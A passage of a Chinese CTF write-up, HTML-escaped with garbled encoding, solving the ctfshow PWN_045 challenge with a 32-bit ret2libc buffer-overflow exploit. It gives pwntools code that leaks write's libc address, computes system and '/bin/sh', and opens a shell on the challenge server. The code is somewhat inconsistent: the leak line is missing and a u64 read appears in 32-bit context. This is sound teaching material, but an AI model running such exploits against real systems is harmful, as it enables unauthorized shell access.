&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š32ä½ æ—  system æ—  &amp;ldquo;/bin/sh&amp;rdquo;ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_045&#34; &gt;PWN_045&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/142.png&#34;
	width=&#34;910&#34;
	height=&#34;200&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/142_hu_82abb708cf1a0811.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/142_hu_f4f82383442791c4.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;455&#34;
		data-flex-basis=&#34;1092px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;32ä½å…³é—­æ ˆä¿æŠ¤å…³é—­PIEã€‚&lt;/p&gt;
&lt;p&gt;IDAåˆ†æmainï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/140.png&#34;
	width=&#34;711&#34;
	height=&#34;240&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/140_hu_175a81e93975ecf3.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/140_hu_cd9361b7005e1aae.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;296&#34;
		data-flex-basis=&#34;711px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/141.png&#34;
	width=&#34;608&#34;
	height=&#34;195&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/141_hu_c9fb5296e0aa6dc5.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/141_hu_f7ef6bad6f31ddd8.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;311&#34;
		data-flex-basis=&#34;748px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯æ˜æ˜¾çš„æº¢å‡ºæ¼æ´äº†ï¼Œåªæ˜¯å…¶ä¸­çš„åç§»å˜äº†ï¼Œå¤§å·®ä¸å·®ï¼Œç°åœ¨æˆ‘ä»¬å…³å¿ƒçš„æ˜¯å¦‚ä½•å»æ‰¾åˆ°æˆ‘ä»¬æ‰€éœ€è¦çš„ä¸œè¥¿å‘¢ï¼Ÿç°åœ¨æ—¢æ²¡æœ‰systemï¼Œä¹Ÿæ²¡æœ‰â€œ/bin/shâ€&lt;/p&gt;
&lt;p&gt;æ€è·¯ï¼šåœ°å€éšæœºåŒ–+NXä¿æŠ¤ç¦ç”¨ret2shellcodeï¼Œé‚£å°±æ˜¯æš—ç¤ºæˆ‘ç”¨ret2libcå’¯ï¼Œç”¨LibcSearcherè·å–å½“å‰libcç‰ˆæœ¬ï¼Œåˆ©ç”¨writeæ³„éœ²å‡ºwriteæœ¬èº«å‡½æ•°åœ°å€ï¼Œå†è·å–ç¨‹åºä¸­å› å¼€å¯NXä¿æŠ¤æ—¶åœ°å€éšæœºåŒ–çš„writeè™šæ‹Ÿåœ°å€ï¼Œä¸¤ä¸ªåœ°å€ç›¸å‡å¾—åˆ°åœ°å€åç§»é‡ï¼Œæ¥ç€å°±èƒ½åæ¨å‡ºsystemã€/bin/shçš„çœŸå®åœ°å€äº†ã€‚åœ¨æ­¤ä¹‹å‰è¦è®°å¾—å…ˆå¡«å……å¥½å˜é‡çš„ç¼“å†²åŒºã€‚&lt;/p&gt;
&lt;p&gt;ä¸ŠåŠéƒ¨åˆ†exp:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;LibcSearcher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28307&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;O.o?&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#ç­‰ç¨‹åºå‘é€è¿™å­—ç¬¦ä¸²è”¡å‘é€ç¬¬ä¸€ä»½payload&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™æ—¶å€™å·²ç»æŠŠwriteå‡½æ•°åœ°å€æ³„éœ²å‡ºæ¥äº†ï¼Œä¸è¿‡çœ‹åˆ°è¿™é‡Œæ¯”è¾ƒæ‡µé€¼å“ˆï¼Œpayloadä¸ºä»€ä¹ˆè¦ä¸Šä¼ è¿™ä¹ˆå¤šï¼Œç›´æ¥è°ƒç”¨writeå‡½æ•°ä¸è¡Œäº†å—ï¼Ÿè¿˜è¦gotã€pltå•¥çš„ï¼ˆå †pltã€gotä¸ç†Ÿæ‚‰çš„å¯ä»¥çœ‹å›&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/#plt%e4%b8%8egot&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-1ä¸­pltå’Œgotè¡¨çš„è®²è§£&lt;/a&gt;ï¼‰ã€‚è®©æˆ‘ç»™ä½ ç»†åˆ†ä¸€ä¸‹ï¼šå…ˆè°ƒç”¨write_pltï¼Œè¿™æŒ‡writeå‡½æ•°çš„æ‰§è¡Œå…¥å£ï¼Œå‘Šè¯‰writeæˆ‘è¦ä½¿ç”¨ä½ äº†ï¼Œè°ƒç”¨writeåï¼Œä¼šä»æ ˆä¸Šè¯»å–è¿™ä¸ªåœ°å€ä½œä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ã€‚è¿™é‡ŒæŒ‡å®š main å‡½æ•°ï¼Œæ˜¯ä¸ºäº†è®©ç¨‹åºåœ¨æ³„éœ²åœ°å€åå›åˆ°ä¸»å‡½æ•°ï¼Œç»§ç»­æ¥æ”¶æˆ‘ä»¬çš„ç¬¬äºŒæ¬¡payloadï¼ˆç”¨äºåç»­è°ƒç”¨ system è·å– shellï¼‰ï¼Œé¿å…ç¨‹åºç›´æ¥é€€å‡ºã€‚ç¬¬ä¸€æ¬¡payloadæ˜¯è·å¾—writeåœ°å€ï¼Œç¬¬äºŒæ¬¡payloadæ˜¯æ‰§è¡Œsystemå‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ç€åˆ°p32(1) + p32(write_got) + p32(4)ï¼šwrite å‡½æ•°çš„ä¸‰ä¸ªå‚æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/143.png&#34;
	width=&#34;670&#34;
	height=&#34;135&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/143_hu_f3c975e2df9b88f1.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/143_hu_c713cca5ee6c652a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;writeå‡½æ•°åŸå‹&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;496&#34;
		data-flex-basis=&#34;1191px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;32 ä½ç¨‹åºä¸­å‚æ•°é€šè¿‡æ ˆä»å³å¾€å·¦ä¼ é€’ï¼Œå› æ­¤æ ˆä¸Šé¡ºåºä¸ºï¼š&lt;code&gt;fd&lt;/code&gt; â†’ &lt;code&gt;buf&lt;/code&gt; â†’ &lt;code&gt;n&lt;/code&gt;ï¼Œä¹Ÿå°±æ˜¯ &lt;code&gt;write(1, write_got, 4)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹åŠéƒ¨åˆ†exp:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LibcSearcher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#ç”¨LibcSearcheræŸ¥è¯¢writeå¯¹åº”çš„libcå½“å‰ç‰ˆæœ¬&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;str_bin_sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;write = u32(io.recvuntil(&amp;rsquo;\xf7&amp;rsquo;)[-4:])è¿™ä¸€æ®µæ¯”è¾ƒé•¿ï¼Œåšè¿‡ä¹‹å‰é¢˜ç›®å¯¹æ­¤æœ‰ç‚¹å°è±¡ï¼Œä¸åº”è¯¥æ˜¯write = u32(io.recv(4))ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ ¸å¿ƒåŸå› æ˜¯&lt;strong&gt;ç¨‹åºè¾“å‡ºä¸­å­˜åœ¨å¹²æ‰°ä¿¡æ¯ï¼Œå¯¼è‡´æ— æ³•ç›´æ¥è¯»å–åˆ°çº¯å‡€çš„ 4 å­—èŠ‚åœ°å€&lt;/strong&gt;ï¼Œä½ æ‰§è¡Œä¸€ä¸‹ç¨‹åºå°±çŸ¥é“äº†ï¼Œä¼šæœ‰â€œO.o?â€å†’å‡ºæ¥ï¼Œè¿™æ˜¯å¹²æ‰°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;io.recv(4)&lt;/code&gt; æ˜¯æœ‰å±€é™æ€§çš„ï¼Œ&lt;code&gt;io.recv(4)&lt;/code&gt; çš„ä½œç”¨æ˜¯&lt;strong&gt;ä»ç¨‹åºè¾“å‡ºä¸­è¯»å–å›ºå®šçš„ 4 å­—èŠ‚æ•°æ®&lt;/strong&gt;ï¼Œä½†å®ƒæœ‰ä¸€ä¸ªä¸¥æ ¼å‰æï¼š&lt;strong&gt;ç¨‹åºå¿…é¡»åªè¾“å‡ºæˆ‘ä»¬éœ€è¦çš„ 4 å­—èŠ‚åœ°å€ï¼Œæ²¡æœ‰ä»»ä½•å¤šä½™å†…å®¹&lt;/strong&gt;ï¼ˆå¦‚æç¤ºæ–‡æœ¬ã€æ¢è¡Œç¬¦ã€å…¶ä»–æ•°æ®ç­‰ï¼‰ã€‚æ­¤æ—¶recvç›´æ¥è¯»å–4ä¸ªå­—èŠ‚ï¼Œé‚£å°±ä¼šè¯»åˆ°O.o?çš„å­—èŠ‚å¯¼è‡´é”™è¯¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;recvuntil(&#39;\xf7&#39;)[-4:]&lt;/code&gt;&lt;/strong&gt;ï¼šé€‚ç”¨äºç¨‹åºè¾“å‡ºå­˜åœ¨å¹²æ‰°ä¿¡æ¯ï¼Œä¸”åœ°å€ä»¥ &lt;code&gt;\xf7&lt;/code&gt; å¼€å¤´ï¼ˆ32 ä½ libc å…¸å‹ç‰¹å¾ï¼‰çš„åœºæ™¯ï¼Œé€šè¿‡ç‰¹å¾å®šä½ + æˆªå–æ¥æå–æ­£ç¡®åœ°å€ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_046å¾…å®š&#34;&gt;PWN_046ï¼ˆå¾…å®šï¼‰
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š64ä½ æ—  system æ—  &amp;ldquo;/bin/sh&amp;rdquo;ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_046&#34; &gt;PWN_046&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDA64åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/144.png&#34;
	width=&#34;836&#34;
	height=&#34;195&#34;
